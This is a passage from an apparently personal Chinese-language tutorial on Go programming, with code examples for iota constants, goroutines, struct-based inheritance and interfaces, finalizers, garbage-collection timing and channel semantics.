<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Newtype <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    T1 Newtype = <span class="literal">iota</span> <span class="comment">// 0</span></span><br><span class="line">    T2                <span class="comment">// 1</span></span><br><span class="line">    T3                <span class="comment">// 2</span></span><br><span class="line">    T4                <span class="comment">// 3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="3-可跳过的值"><a href="#3-可跳过的值" class="headerlink" title="(3) 可跳过的值"></a>(3) 可跳过的值</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> AudioOutput <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    OutMute AudioOutput = <span class="literal">iota</span> <span class="comment">// 0</span></span><br><span class="line">    OutMono                    <span class="comment">// 1</span></span><br><span class="line">    OutStereo                  <span class="comment">// 2</span></span><br><span class="line">    _</span><br><span class="line">    _</span><br><span class="line">    OutSurround                <span class="comment">// 5</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="4-位掩码表达式"><a href="#4-位掩码表达式" class="headerlink" title="(4) 位掩码表达式"></a>(4) 位掩码表达式</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Allergen <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    IgEggs Allergen = <span class="number">1</span> &lt;&lt; <span class="literal">iota</span> <span class="comment">// 1 &lt;&lt; 0 which is 00000001</span></span><br><span class="line">    IgChocolate                         <span class="comment">// 1 &lt;&lt; 1 which is 00000010</span></span><br><span class="line">    IgNuts                              <span class="comment">// 1 &lt;&lt; 2 which is 00000100</span></span><br><span class="line">    IgStrawberries                      <span class="comment">// 1 &lt;&lt; 3 which is 00001000</span></span><br><span class="line">    IgShellfish                         <span class="comment">// 1 &lt;&lt; 4 which is 00010000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="5-定义数量级"><a href="#5-定义数量级" class="headerlink" title="(5) 定义数量级"></a>(5) 定义数量级</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ByteSize <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    _           = <span class="literal">iota</span>                   <span class="comment">// ignore first value by assigning to blank identifier</span></span><br><span class="line">    KB ByteSize = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)       <span class="comment">// 1 &lt;&lt; (10*1)</span></span><br><span class="line">    MB                                   <span class="comment">// 1 &lt;&lt; (10*2)</span></span><br><span class="line">    GB                                   <span class="comment">// 1 &lt;&lt; (10*3)</span></span><br><span class="line">    TB                                   <span class="comment">// 1 &lt;&lt; (10*4)</span></span><br><span class="line">    PB                                   <span class="comment">// 1 &lt;&lt; (10*5)</span></span><br><span class="line">    EB                                   <span class="comment">// 1 &lt;&lt; (10*6)</span></span><br><span class="line">    ZB                                   <span class="comment">// 1 &lt;&lt; (10*7)</span></span><br><span class="line">    YB                                   <span class="comment">// 1 &lt;&lt; (10*8)</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="6-定义在一行的情况"><a href="#6-定义在一行的情况" class="headerlink" title="(6) 定义在一行的情况"></a>(6) 定义在一行的情况</h4><ul>
<li>跟普通形式 没什么不同</li>
<li>iota 在下一行增长，而不是立即取得它的引用。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	Apple, Banana     = <span class="literal">iota</span> + <span class="number">1</span>, <span class="literal">iota</span> + <span class="number">2</span> <span class="comment">// 0+1, 0+2</span></span><br><span class="line">	Cherimoya, Durian                      <span class="comment">// 1+1, 1+2</span></span><br><span class="line">	Elderberry, Fig                        <span class="comment">// 2+1, 2+2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1, 2</span></span><br><span class="line"><span class="comment">2, 3</span></span><br><span class="line"><span class="comment">3, 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="7-中间插队"><a href="#7-中间插队" class="headerlink" title="(7) 中间插队"></a>(7) 中间插队</h4><p>中间插队时，iota 会被覆盖掉 不再继续自增。但是用另一个 iota 接一下，又会继续自增。<br>示例如下，中间插入了5、3和6，3下面有itoa接，6没有。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    a = <span class="literal">iota</span>		<span class="comment">// 0	itoa = 0</span></span><br><span class="line">    b = <span class="number">5</span>			<span class="comment">// 5	itoa = 1</span></span><br><span class="line">    c = <span class="number">3</span>			<span class="comment">// 3	itoa = 2</span></span><br><span class="line">    d = <span class="literal">iota</span>		<span class="comment">// 3	itoa = 3</span></span><br><span class="line">    e = <span class="number">6</span>			<span class="comment">// 6</span></span><br><span class="line">    f				<span class="comment">// 6</span></span><br><span class="line">    g				<span class="comment">// 6</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="10-并发"><a href="#10-并发" class="headerlink" title="10. 并发"></a>10. 并发</h2><h3 id="10-1-基础概念"><a href="#10-1-基础概念" class="headerlink" title="10.1. 基础概念"></a>10.1. 基础概念</h3><ul>
<li><a href="https://zhuanlan.zhihu.com/p/27056944">go调度详解</a></li>
</ul>
<p><strong>和线程的区别</strong></p>
<ul>
<li>OS线程（操作系统线程）一本都有固定的栈内存（通常为2MB）</li>
<li>一个 goroutine 的栈在其生命周期开始时只有很小的栈（典型情况下2KB），goroutine 的栈不是固定的，他可以按需增大和缩小，grorutine的栈大小限制可以达到1GB，但极少情况下会到1GB。所以在Go语言中一次创建十万左右的 grorutine 也是可以的。</li>
</ul>
<p><strong>和线程的关系</strong></p>
<ul>
<li>一个操作系统线程对应用户态多个goroutine。</li>
<li>go程序可以同时使用多个操作系统线程。</li>
<li>goroutine和OS线程是多对多的关系，即m:n。</li>
</ul>
<p><strong>其他</strong></p>
<ul>
<li>1.5版本之前，go仅占用一个核执行</li>
<li>1.5之后，默认使用所有核</li>
</ul>
<h3 id="10-2-sync-WaitGroup-等待退出"><a href="#10-2-sync-WaitGroup-等待退出" class="headerlink" title="10.2. sync.WaitGroup 等待退出"></a>10.2. <code>sync.WaitGroup</code> 等待退出</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello&quot;</span>, i)</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello world, main&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> hello(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-3-runtime-GOMAXPROCS-i-int-限定占用核心数"><a href="#10-3-runtime-GOMAXPROCS-i-int-限定占用核心数" class="headerlink" title="10.3. runtime.GOMAXPROCS(i int) 限定占用核心数"></a>10.3. <code>runtime.GOMAXPROCS(i int)</code> 限定占用核心数</h3><ul>
<li>go可以设定goroutine占用的核心数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello&quot;</span>, i)</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello world, main&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> hello(i)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10-4-互斥锁"><a href="#10-4-互斥锁" class="headerlink" title="10.4. 互斥锁"></a>10.4. 互斥锁</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="11-面向对象编程"><a href="#11-面向对象编程" class="headerlink" title="11. 面向对象编程"></a>11. 面向对象编程</h2><h3 id="11-1-属性和方法"><a href="#11-1-属性和方法" class="headerlink" title="11.1. 属性和方法"></a>11.1. 属性和方法</h3><ul>
<li>go中使用结构体可以代表类</li>
<li>定义接受者代表方法</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rectangle define class</span></span><br><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    X <span class="type">int</span></span><br><span class="line">    Y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Area define method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Rectangle)</span></span> Area() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.X * r.Y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    rec := Rectangle&#123;</span><br><span class="line">        X: <span class="number">5</span>,</span><br><span class="line">        Y: <span class="number">10</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(rec.Area())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-2-访问权限"><a href="#11-2-访问权限" class="headerlink" title="11.2. 访问权限"></a>11.2. 访问权限</h3><ul>
<li>首字母大小写可以控制访问权限</li>
<li>不过小写对整个package都可以访问，外部不可以访问</li>
</ul>
<h3 id="11-3-继承"><a href="#11-3-继承" class="headerlink" title="11.3. 继承"></a>11.3. 继承</h3><ul>
<li>结构体里面直接定义另一个结构体就可以实现继承</li>
<li>但是初始化不能直接初始化父类的属性</li>
<li>同一个包内，大小写都可以访问到</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rectangle define class</span></span><br><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    Y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Area define method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Rectangle)</span></span> Area() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.x * r.Y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> testRec <span class="keyword">struct</span> &#123;</span><br><span class="line">    Rectangle	<span class="comment">// 继承属性，不写不会继承属性，但是可以实现方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Area 可以调用，也可以像下面这样直接重写</span></span><br><span class="line"><span class="comment">// func (r *testRec) Area() int &#123;</span></span><br><span class="line"><span class="comment">//     return r.x * r.Y</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    rec := testRec&#123;&#125;</span><br><span class="line">    rec.x = <span class="number">10</span></span><br><span class="line">    rec.Y = <span class="number">4</span></span><br><span class="line">    fmt.Println(rec.Area())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-4-多态"><a href="#11-4-多态" class="headerlink" title="11.4. 多态"></a>11.4. 多态</h3><ul>
<li>多态在go里面更多把思想转成接口</li>
<li>对外提供接口，但是存在不同实现</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口Product，定义接口存在方法Use</span></span><br><span class="line"><span class="keyword">type</span> Product <span class="keyword">interface</span> &#123;</span><br><span class="line">	Use()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// productA继承接口</span></span><br><span class="line"><span class="keyword">type</span> productA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以继承另一个结构体</span></span><br><span class="line"><span class="keyword">type</span> productB <span class="keyword">struct</span> &#123;</span><br><span class="line">	productA</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-5-析构函数"><a href="#11-5-析构函数" class="headerlink" title="11.5. 析构函数"></a>11.5. 析构函数</h3><ul>
<li>go可以给类设置析构函数，但是析构时机是GC触发的时机</li>
<li>如果进程直接退出，由操作系统回收内存，不会触发析构函数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> testT <span class="keyword">struct</span> &#123;</span><br><span class="line">	a    <span class="type">int</span></span><br><span class="line">	next *testT</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> root testT</span><br><span class="line">	runtime.SetFinalizer(&amp;root, <span class="function"><span class="keyword">func</span> <span class="params">(tmp *testT)</span></span>  &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;hhh&quot;</span>, tmp.a)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-6-纯虚函数"><a href="#11-6-纯虚函数" class="headerlink" title="11.6. 纯虚函数"></a>11.6. 纯虚函数</h3><ul>
<li>对于go来说，不存在虚函数的概念，但是如果想要使用父类指针指向子类指针，必须实现父类定义的所有接口</li>
<li>接口类指向子类需要取地址，接口类可以直接调用自己的方法，会根据内存找到子类的方法调用</li>
<li><strong><font color="red">接口类指向子类内部只保存了子类的地址，所以参数传递可以值传递，改动会改动到内部子类的属性</font></strong></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TestI <span class="keyword">interface</span> &#123;</span><br><span class="line">	TestFunc()</span><br><span class="line">	Print()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestImpl <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TestImpl)</span></span> Print() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;TestImpl Print&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TestImpl1 <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">()</span></span> TestI &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;TestImpl1&#123;&#125;		<span class="comment">// 这里取地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TestImpl1)</span></span> TestFunc() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;TestImpl1 TestFunc&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *TestImpl1)</span></span> Print() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;TestImpl1 Print&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := &amp;TestImpl&#123;&#125; <span class="comment">// 不会报错，没有实现不会认为是继承关系</span></span><br><span class="line">	a.Print()</span><br><span class="line">	<span class="keyword">var</span> b TestI = &amp;TestImpl&#123;&#125;	<span class="comment">// 有这句话就会报错，因为TestImpl没有完全实现TestI</span></span><br><span class="line">	<span class="keyword">var</span> c TestI = Constructor()</span><br><span class="line">	<span class="keyword">var</span> d *TestI = &amp;c</span><br><span class="line">	c.Print()	<span class="comment">// 可以正常调用，调用的是子类的方法</span></span><br><span class="line">	d.Print()	<span class="comment">// 报错，因为找不到 func (t *TestI)Print() 的实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="12-指针"><a href="#12-指针" class="headerlink" title="12. 指针"></a>12. 指针</h2><h3 id="12-1-int转指针"><a href="#12-1-int转指针" class="headerlink" title="12.1. int转指针"></a>12.1. int转指针</h3><ul>
<li>go中限制了指针类型的转换，不允许将int转成指针类型</li>
<li>但是，转换一下想法，用二级指针进行赋值即可</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp **testT</span><br><span class="line">tmp1 := <span class="number">0x111111111</span></span><br><span class="line">tmp = (**testT)(unsafe.Pointer(&amp;tmp1))</span><br><span class="line">fmt.Printf(<span class="string">&quot;%p&quot;</span>, *tmp)</span><br></pre></td></tr></table></figure>

<h2 id="13-GC-垃圾回收机制"><a href="#13-GC-垃圾回收机制" class="headerlink" title="13. GC 垃圾回收机制"></a>13. GC 垃圾回收机制</h2><ul>
<li>GC（Garbage Collection）</li>
<li>下面内容参考自 <a href="https://zhuanlan.zhihu.com/p/390926887">图解golang垃圾回收机制</a></li>
</ul>
<h3 id="13-1-内存管理"><a href="#13-1-内存管理" class="headerlink" title="13.1. 内存管理"></a>13.1. 内存管理</h3><p>程序在内存上被分为堆区、栈区、全局数据区、代码段、数据区五个部分。对于C++等早期编程语言栈上的内存由编译器管理回收，堆上的内存空间需要编程人员负责申请与释放。在Go中栈上内存仍由编译器负责管理回收，而堆上的内存由编译器和垃圾收集器负责管理回收，给编程人员带来了极大的便利性。</p>
<img src="2022-04-02-02.jpg" />

<h3 id="13-2-GC触发时机"><a href="#13-2-GC触发时机" class="headerlink" title="13.2. GC触发时机"></a>13.2. GC触发时机</h3><p>触发GC有俩个条件，一是堆内存的分配达到控制器计算的触发堆大小，初始大小环境变量GOGC，之后堆内存达到上一次垃圾收集的2倍时才会触发GC。二是如果一定时间内没有触发，就会触发新的循环，该触发条件由runtime.forcegcperiod变量控制，默认为2分钟。</p>
<h3 id="13-3-GC带来的便利和坑"><a href="#13-3-GC带来的便利和坑" class="headerlink" title="13.3. GC带来的便利和坑"></a>13.3. GC带来的便利和坑</h3><h4 id="1-便利"><a href="#1-便利" class="headerlink" title="1) 便利"></a>1) 便利</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> testT <span class="keyword">struct</span> &#123;</span><br><span class="line">	a    <span class="type">int</span></span><br><span class="line">	next *testT</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testFunc</span><span class="params">(root *testT)</span></span> (arr []<span class="type">string</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">var</span> tmp testT</span><br><span class="line">		tmp.a = i</span><br><span class="line">		<span class="comment">// 引用了局部变量的地址，此变量在编译时会放到堆上而不是栈上</span></span><br><span class="line">		root.next = &amp;tmp</span><br><span class="line">		arr = <span class="built_in">append</span>(arr, fmt.Sprintf(<span class="string">&quot;%p&quot;</span>, &amp;tmp))</span><br><span class="line">		<span class="comment">// 这里加上析构函数查看触发时机</span></span><br><span class="line">		runtime.SetFinalizer(&amp;tmp, <span class="function"><span class="keyword">func</span> <span class="params">(tmp *testT)</span></span>  &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;hhh&quot;</span>, tmp.a)</span><br><span class="line">		&#125;)</span><br><span class="line">		root = root.next</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> root testT</span><br><span class="line"></span><br><span class="line">	arr := testFunc(&amp;root)</span><br><span class="line">	<span class="comment">// 手动触发GC，这里什么都回收不掉，因为后面还在使用</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">		runtime.GC()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> e := &amp;root; e != <span class="literal">nil</span>; e = e.next &#123;</span><br><span class="line">		fmt.Println(e.a)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 手动触发GC，GC一次回收一个变量</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">		runtime.GC()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果没有下面这一句使用了root，上面就会连带root的内存也回收掉，不会等到函数退出，因为分析后续没有再使用局部变量</span></span><br><span class="line">	<span class="comment">// 有下面这一句使用了root，上面就不会回收root和子节点</span></span><br><span class="line">	fmt.Println(root.a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="14-struct"><a href="#14-struct" class="headerlink" title="14. struct"></a>14. struct</h2><h3 id="14-1-String-默认打印方法"><a href="#14-1-String-默认打印方法" class="headerlink" title="14.1. String() 默认打印方法"></a>14.1. String() 默认打印方法</h3><ul>
<li>使用值传递实现的，打印原始和指针类型都可以输出</li>
<li>使用指针传递实现的，必须使用指针类型打印才能输出，值传递输出不出来</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现String方法后，打印时会默认调用此方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a A)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;A name: &quot;</span> + a.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 原型模式就是需要提供clone的接口，实现对对象的拷贝</span></span><br><span class="line">	a := A&#123;name: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">	fmt.Println(a) <span class="comment">// A name: a 默认调用String方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-2-初始化父类属性"><a href="#14-2-初始化父类属性" class="headerlink" title="14.2. 初始化父类属性"></a>14.2. 初始化父类属性</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ProductA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProductB <span class="keyword">struct</span> &#123;</span><br><span class="line">	ProductA</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	p := ProductB&#123;</span><br><span class="line">		ProductA: ProductA&#123;</span><br><span class="line">			Name: <span class="string">&quot;ProductB&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(p.Name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="15-常量"><a href="#15-常量" class="headerlink" title="15. 常量"></a>15. 常量</h2><ul>
<li>go中常量只能是数字、布尔、字符串，其他类型无法定义成常量</li>
</ul>
<h2 id="16-package-包"><a href="#16-package-包" class="headerlink" title="16. package 包"></a>16. package 包</h2><h3 id="16-1-init函数"><a href="#16-1-init函数" class="headerlink" title="16.1. init函数"></a>16.1. init函数</h3><ul>
<li>init函数不可被调用，是golang提供的引入包就会调用的一个初始化函数</li>
<li>对于<code>package main</code>来说也是一样的，会在main函数调用前进行调用</li>
<li>init可以定义多个，按照定义顺序执行</li>
</ul>
<h2 id="17-channel"><a href="#17-channel" class="headerlink" title="17. channel"></a>17. channel</h2><h3 id="17-1-基本知识"><a href="#17-1-基本知识" class="headerlink" title="17.1. 基本知识"></a>17.1. 基本知识</h3><ul>
<li>天生的观察者消费者模式，支持多写多读</li>
<li>自带防止惊群效应的实现，读协程只会唤醒一个</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">var</span> wgW sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(i <span class="type">int</span>, ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">	<span class="comment">// 这里防止了惊群，不会同一个数据给到多个消费者</span></span><br><span class="line">	<span class="keyword">for</span> a := <span class="keyword">range</span> ch &#123;</span><br><span class="line">		fmt.Println(i, a)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(i <span class="type">int</span>, ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	ch &lt;- i</span><br><span class="line">	fmt.Println(i, <span class="string">&quot; write&quot;</span>)</span><br><span class="line">	wgW.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">500</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> read(i, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">		wgW.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> write(i, ch)</span><br><span class="line">	&#125;</span><br><span class="line">	wgW.Wait()</span><br><span class="line">	<span class="built_in">close</span>(ch)	<span class="comment">// 这里立刻退出，不能再写数据了，但是可以读</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;close channel&quot;</span>)</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17-2-close后的特性"><a href="#17-2-close后的特性" class="headerlink" title="17.2. close后的特性"></a>17.2. close后的特性</h3><ul>
<li>close不会阻塞，关闭后可读不可写，写会崩溃</li>
<li>close后，正在阻塞的消费者可以拿到一个默认值，for的方式会直接退出循环</li>
<li>close后，正在阻塞的生产者会崩溃</li>
</ul>
